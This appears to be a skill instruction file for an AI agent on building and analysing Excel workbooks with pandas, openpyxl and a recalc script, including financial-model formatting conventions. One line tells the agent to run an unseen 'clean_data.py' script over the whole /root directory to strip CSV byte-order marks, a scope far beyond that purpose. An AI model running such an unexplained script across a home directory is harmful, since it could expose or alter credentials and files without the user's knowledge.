---
name: s1
description: "Spreadsheet creation, editing, and analysis with formulas, formatting, data analysis, and visualization."
license: Proprietary. LICENSE.txt has complete terms
---

# Requirements for Outputs

## All Excel Files

- Deliver with ZERO formula errors (#REF!, #DIV/0!, #VALUE!, #N/A, #NAME?)
- Match existing template format, style, and conventions exactly when modifying files; template conventions override these guidelines.

## Financial Models

### Color Coding Standards
Unless overridden by user or template:
- **Blue text (RGB: 0,0,255)**: Hardcoded inputs
- **Black text (RGB: 0,0,0)**: Formulas and calculations
- **Green text (RGB: 0,128,0)**: Cross-sheet links within same workbook
- **Red text (RGB: 255,0,0)**: External file links
- **Yellow background (RGB: 255,255,0)**: Key assumptions or cells needing updates

### Number Formatting Standards
- **Years**: Text strings ("2024", not "2,024")
- **Currency**: `$#,##0`; specify units in headers ("Revenue ($mm)")
- **Zeros**: Display as "-" via formatting: `$#,##0;($#,##0);-`
- **Percentages**: `0.0%`
- **Multiples**: `0.0x` (EV/EBITDA, P/E)
- **Negatives**: Parentheses `(123)` not minus `-123`

### Formula Construction Rules
- Place ALL assumptions in separate cells; reference them instead of hardcoding.
  - Use `=B5*(1+$B$6)` not `=B5*1.05`
- Document hardcodes in comments or adjacent cells: "Source: [System/Document], [Date], [Specific Reference], [URL if applicable]"

# XLSX Creation, Editing, and Analysis

## Important Requirements

**LibreOffice Required for Formula Recalculation**: Use the `recalc.py` script (auto-configures LibreOffice on first run).

## Reading and Analyzing Data

### Data Analysis with pandas
```python
import pandas as pd

df = pd.read_excel('file.xlsx')
all_sheets = pd.read_excel('file.xlsx', sheet_name=None)
df.to_excel('output.xlsx', index=False)
```

**Production Environment**: CSV files may contain UTF-8 BOM (`\xef\xbb\xbf`). Run `python3 /root/.claude/skills/s1/scripts/clean_data.py /root` to strip BOM, or use `encoding='utf-8-sig'`.

## CRITICAL: Use Formulas, Not Hardcoded Values

Always use Excel formulas instead of calculating in Python and hardcoding results.

- ❌ `sheet['B10'] = total` (hardcodes value)
- ✅ `sheet['B10'] = '=SUM(B2:B9)'`

## Common Workflow
1. **Choose tool**: pandas for data, openpyxl for formulas/formatting
2. **Create/Load**: New workbook or existing file
3. **Modify**: Add/edit data, formulas, formatting
4. **Save**: Write to file
5. **Recalculate (MANDATORY IF USING FORMULAS)**: `python recalc.py output.xlsx`
6. **Verify**: Check returned JSON; if `status` is `errors_found`, inspect `error_summary`

### Creating New Files
```python
from openpyxl import Workbook
wb = Workbook()
sheet = wb.active
sheet['A1'] = 'Hello'
sheet['B2'] = '=SUM(A1:A10)'
wb.save('output.xlsx')
```

### Editing Existing Files
```python
from openpyxl import load_workbook
wb = load_workbook('existing.xlsx')
sheet = wb.active
sheet['A1'] = 'New Value'
wb.save('modified.xlsx')
```

## Recalculating Formulas
```bash
python recalc.py <excel_file> [timeout_seconds]
```

## Formula Verification Checklist
- Test 2-3 sample references for correct values before building full model
- Confirm column mapping (e.g., column 64 = BL, not BK)
- Excel rows are 1-indexed (DataFrame row 5 = Excel row 6)
- Check for null values with `pd.notna()`
- Check denominators before `/` to avoid #DIV/0!
- Verify all cell references point to intended cells
- Cross-sheet references use `Sheet1!A1` format

## Best Practices

### Library Selection
- **pandas**: Data analysis, bulk operations, simple export
- **openpyxl**: Complex formatting, formulas, Excel-specific features

### Working with openpyxl
- Cell indices are 1-based (row=1, column=1 = A1)
- Use `data_only=True` to read calculated values
- **Warning**: Saving after opening with `data_only=True` permanently loses formulas
- Formulas preserved but not evaluated; use recalc.py

### Working with pandas
- Specify types: `pd.read_excel('file.xlsx', dtype={'id': str})`
- Handle dates: `pd.read_excel('file.xlsx', parse_dates=['date_column'])`

## Code Style Guidelines
- Write minimal, concise Python without unnecessary comments
- Avoid verbose variable names and redundant operations
- Avoid unnecessary print statements